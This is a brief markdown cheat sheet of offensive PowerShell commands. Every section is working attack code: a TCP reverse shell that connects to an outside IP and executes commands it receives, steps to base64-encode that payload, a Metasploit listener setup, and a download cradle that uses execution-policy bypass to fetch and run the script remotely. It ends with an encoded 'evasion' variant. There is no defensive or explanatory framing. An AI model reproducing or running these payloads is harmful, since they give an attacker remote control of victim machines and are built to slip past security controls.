### Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Paylod to UTF-16
```bash
cat revshell.ps1 | iconv -f UTF-8 -t UTF-16LE | base64 -w 0
```

### Set up listener
```bash
msfconsole
use multi/handler
set payload windows/powershell_reverse_tcp
set LHOST 10.10.14.78
set LPORT 4444
exploit
```


### Rev Shell
```bash
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:8000/revshell.ps1'')"
```

### Rev Shell via Evasion
```bash
powershell.exe -nop -exec bypass -e JABjAGwAaQB...
```